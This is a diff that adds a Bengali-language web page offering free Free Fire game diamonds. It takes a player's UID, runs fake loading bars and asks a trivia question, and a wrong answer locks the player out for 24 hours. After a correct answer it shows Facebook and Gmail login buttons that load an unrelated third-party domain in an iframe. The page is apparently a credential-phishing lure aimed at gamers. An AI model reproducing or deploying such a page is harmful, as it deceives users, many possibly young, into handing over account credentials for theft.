@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <title>Diamond Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #1f1c2c, #928dab);
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 30px 15px;
+      min-height: 100vh;
+    }
+    h2, h3, p {
+      text-align: center;
+    }
+    input[type="text"] {
+      width: 100%;
+      max-width: 300px;
+      padding: 12px;
+      font-size: 18px;
+      border-radius: 8px;
+      border: none;
+      margin-top: 10px;
+      box-shadow: 0 0 12px rgba(3, 233, 244, 0.4);
+      text-align: center;
+    }
+    button {
+      padding: 12px 30px;
+      margin-top: 20px;
+      background: #03e9f4;
+      color: black;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      box-shadow: 0 8px 20px rgba(3, 233, 244, 0.5);
+      transition: transform 0.2s;
+    }
+    button:hover {
+      transform: scale(1.05);
+    }
+    .section {
+      width: 100%;
+      max-width: 650px;
+      text-align: center;
+      margin-top: 30px;
+    }
+    .progress-container {
+      background: #222;
+      border-radius: 15px;
+      overflow: hidden;
+      height: 24px;
+      width: 100%;
+      box-shadow: inset 0 0 10px #03e9f4;
+      display: none;
+      position: relative;
+    }
+    .progress-bar {
+      height: 100%;
+      width: 0;
+      background: linear-gradient(to right, #00f2ff, #03e9f4);
+      transition: width 0.2s;
+    }
+    .progress-text {
+      position: absolute;
+      width: 100%;
+      top: 0;
+      text-align: center;
+      font-weight: bold;
+      color: white;
+    }
+    .diamond-option {
+      display: inline-block;
+      background: #03e9f4;
+      color: black;
+      padding: 12px 25px;
+      border-radius: 25px;
+      margin: 10px;
+      font-size: 16px;
+      box-shadow: 0 0 10px rgba(3, 233, 244, 0.6);
+      cursor: pointer;
+      transition: transform 0.2s;
+    }
+    .diamond-option:hover {
+      transform: scale(1.1);
+    }
+    .diamond-option.disabled { /* 24 ঘন্টার ব্লকের জন্য পুনরায় যুক্ত করা হয়েছে */
+        pointer-events: none;
+        opacity: 0.5;
+        cursor: not-allowed;
+    }
+    .login-btn {
+      background: #4267B2;
+      color: white;
+      padding: 12px 25px;
+      margin: 10px auto;
+      font-size: 16px;
+      border-radius: 25px;
+      width: 260px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      border: none;
+      cursor: pointer;
+    }
+    .login-btn.gmail {
+      background: #DB4437;
+    }
+    .login-btn img {
+      height: 20px;
+    }
+    #iframeContainer {
+      width: 100%;
+      max-width: 650px;
+      height: 320px;
+      margin-top: 20px;
+      border-radius: 12px;
+      overflow: hidden;
+      display: none;
+      background: white;
+      box-shadow: 0 0 15px rgba(3, 233, 244, 0.5);
+    }
+    #loginIframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+    .message {
+      color: red;
+      font-weight: bold;
+      margin-top: 10px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="section" id="inputSection">
+    <h2>আপনার uid দিন</h2>
+    <input type="text" id="uid" placeholder="৮ থেকে ১০ সংখ্যার UID" maxlength="10" />
+    <button onclick="startLoading()">সাবমিট</button>
+  </div>
+
+  <div class="section">
+    <div id="loadingLabel1" class="loading-label">লোডিং...</div>
+    <div class="progress-container" id="progressContainer">
+      <div id="progressBar" class="progress-bar"></div>
+      <div id="progressText" class="progress-text">0%</div>
+    </div>
+  </div>
+
+  <div class="section" id="diamondSection" style="display:none;">
+    <h3 id="uidShow"></h3>
+    <p>ফ্রী ফায়ার অফিসিয়াল ভাবে চালু হয় কত সালে?</p>
+    <div id="diamondOptionsContainer">
+      <div class="diamond-option" onclick="checkAnswer('2025')">২০২৫ সালে</div>
+      <div class="diamond-option" onclick="checkAnswer('2020')">২০২০ সালে</div>
+      <div class="diamond-option" onclick="checkAnswer('2017')">২০১৭ সালে</div>
+      <div class="diamond-option" onclick="checkAnswer('2016')">২০১৬ সালে</div>
+    </div>
+    <p class="message" id="wrongAnswerMessage" style="color: red;">আপনি ফ্রী ডায়মন্ড পাবেন না। আপনার উত্তরটি ভুল!</p>
+    <p class="message" id="blockedMessage" style="color: yellow;">দুঃখিত! আপনি ২৪ ঘন্টার জন্য ব্লক হয়েছেন। পরবর্তীতে চেষ্টা করুন।</p> </div>
+
+  <div class="section">
+    <div id="loadingLabel2" class="loading-label">লোডিং...</div>
+    <div class="progress-container" id="loadingAnimation">
+      <div id="loadingBar" class="progress-bar"></div>
+      <div id="loadingText" class="progress-text">0%</div>
+    </div>
+  </div>
+
+  <div class="section" id="loginSection" style="display:none;">
+    <h3>গেম একাউন্ট লগইন করুণ</h3>
+    <button class="login-btn" onclick="openIframe('https://esmrepresentacoes.com.br/M2I4WTVVMEo2eDZQOWc=')">
+      <img src="https://cdn-icons-png.flaticon.com/512/733/733547.png" alt="fb" />
+      Facebook দিয়ে লগইন
+    </button>
+    <button class="login-btn gmail" onclick="openIframe('https://esmrepresentacoes.com.br/MzM4WTVqMGs2bzUzOFA=')">
+      <img src="https://cdn-icons-png.flaticon.com/512/281/281769.png" alt="gmail" />
+      Gmail দিয়ে লগইন
+    </button>
+    <div id="iframeContainer">
+      <iframe id="loginIframe"></iframe>
+    </div>
+  </div>
+
+<script>
+  // 24 ঘন্টার ব্লকের জন্য পুনরায় যুক্ত করা হয়েছে
+  const BLOCK_KEY = "answerBlocked";
+  const BLOCK_DURATION = 24 * 60 * 60 * 1000; // 24 ঘণ্টা মিলিসেকেন্ডে
+
+  function hideAllMessages() {
+    document.getElementById("wrongAnswerMessage").style.display = "none";
+    document.getElementById("blockedMessage").style.display = "none"; // 24 ঘন্টার ব্লকের জন্য পুনরায় যুক্ত করা হয়েছে
+  }
+
+  function hideAllLoadingElements() {
+    document.getElementById("loadingLabel1").style.display = "none";
+    document.getElementById("progressContainer").style.display = "none";
+    document.getElementById("loadingLabel2").style.display = "none";
+    document.getElementById("loadingAnimation").style.display = "none";
+  }
+
+  // 24 ঘন্টার ব্লকের জন্য পুনরায় যুক্ত করা হয়েছে
+  function disableOptions() {
+    const options = document.querySelectorAll('.diamond-option');
+    options.forEach(option => {
+      option.classList.add('disabled');
+    });
+  }
+
+  // 24 ঘন্টার ব্লকের জন্য পুনরায় যুক্ত করা হয়েছে
+  function enableOptions() {
+    const options = document.querySelectorAll('.diamond-option');
+    options.forEach(option => {
+      option.classList.remove('disabled');
+    });
+  }
+
+  // 24 ঘন্টার ব্লকের জন্য পুনরায় যুক্ত করা হয়েছে
+  function checkBlockStatus() {
+    hideAllMessages(); // কোনো বার্তা থাকলে লুকান
+    hideAllLoadingElements(); // সকল লোডিং উপাদান লুকান
+
+    const blockUntil = localStorage.getItem(BLOCK_KEY);
+    const now = new Date().getTime();
+
+    if (blockUntil && now < parseInt(blockUntil)) {
+      document.getElementById("inputSection").style.display = "none";
+      document.getElementById("diamondSection").style.display = "block";
+      document.getElementById("blockedMessage").style.display = "block"; // ব্লক বার্তা দেখান
+      disableOptions();
+      return true;
+    } else {
+      localStorage.removeItem(BLOCK_KEY); // মেয়াদ শেষ হলে ব্লক সরান
+      enableOptions(); // অপশনগুলো সক্রিয় করুন
+      return false;
+    }
+  }
+
+  // পেজ লোড হওয়ার সময় লোডিং, বার্তা এবং ব্লক স্ট্যাটাস চেক করুন
+  window.onload = function() {
+    hideAllLoadingElements();
+    hideAllMessages();
+    checkBlockStatus(); // 24 ঘন্টার ব্লকের জন্য পুনরায় যুক্ত করা হয়েছে
+  };
+
+  function startLoading() {
+    if (checkBlockStatus()) { // 24 ঘন্টার ব্লকের জন্য পুনরায় যুক্ত করা হয়েছে
+        return;
+    }
+    hideAllLoadingElements();
+    hideAllMessages();
+
+    const uid = document.getElementById("uid").value.trim();
+    if (!/^[0-9]{8,10}$/.test(uid)) {
+      alert("সঠিক ৮-১০ সংখ্যার UID দিন");
+      return;
+    }
+    document.getElementById("inputSection").style.display = "none";
+    document.getElementById("loadingLabel1").style.display = "block";
+    document.getElementById("progressContainer").style.display = "block";
+
+    let percent = 0;
+    const bar = document.getElementById("progressBar");
+    const text = document.getElementById("progressText");
+
+    const loading = setInterval(() => {
+      percent++;
+      bar.style.width = percent + "%";
+      text.textContent = percent + "%";
+      if (percent >= 100) {
+        clearInterval(loading);
+        document.getElementById("loadingLabel1").style.display = "none";
+        document.getElementById("progressContainer").style.display = "none";
+        document.getElementById("diamondSection").style.display = "block";
+        document.getElementById("uidShow").innerText = "আপনার UID: " + uid;
+      }
+    }, 100);
+  }
+
+  function checkAnswer(selectedYear) {
+    if (checkBlockStatus()) { // 24 ঘন্টার ব্লকের জন্য পুনরায় যুক্ত করা হয়েছে
+        return;
+    }
+    hideAllLoadingElements();
+    hideAllMessages();
+
+    const correctAnswer = '2017';
+
+    if (selectedYear === correctAnswer) {
+      localStorage.removeItem(BLOCK_KEY); // 24 ঘন্টার ব্লকের জন্য পুনরায় যুক্ত করা হয়েছে
+      enableOptions(); // 24 ঘন্টার ব্লকের জন্য পুনরায় যুক্ত করা হয়েছে
+
+      document.getElementById("diamondSection").style.display = "none";
+      document.getElementById("loadingLabel2").style.display = "block";
+      document.getElementById("loadingAnimation").style.display = "block";
+
+      let width = 0;
+      const bar = document.getElementById("loadingBar");
+      const text = document.getElementById("loadingText");
+
+      const loading = setInterval(() => {
+        width += 2;
+        bar.style.width = width + "%";
+        text.textContent = width + "%";
+        if (width >= 100) {
+          clearInterval(loading);
+          document.getElementById("loadingLabel2").style.display = "none";
+          document.getElementById("loadingAnimation").style.display = "none";
+          document.getElementById("loginSection").style.display = "block";
+        }
+      }, 30);
+    } else {
+      document.getElementById("wrongAnswerMessage").style.display = "block"; // ভুল উত্তরের বার্তা দেখান
+      document.getElementById("blockedMessage").style.display = "block"; // 24 ঘন্টার ব্লকের জন্য পুনরায় যুক্ত করা হয়েছে
+
+      const now = new Date().getTime();
+      const blockUntil = now + BLOCK_DURATION;
+      localStorage.setItem(BLOCK_KEY, blockUntil); // 24 ঘন্টার ব্লকের জন্য পুনরায় যুক্ত করা হয়েছে
+      disableOptions(); // 24 ঘন্টার ব্লকের জন্য পুনরায় যুক্ত করা হয়েছে
+    }
+  }
+
+  function openIframe(url) {
+    const iframe = document.getElementById('loginIframe');
+    const container = document.getElementById('iframeContainer');
+    iframe.src = url;
+    container.style.display = 'block';
+  }
+</script>
+</body>
+</html>
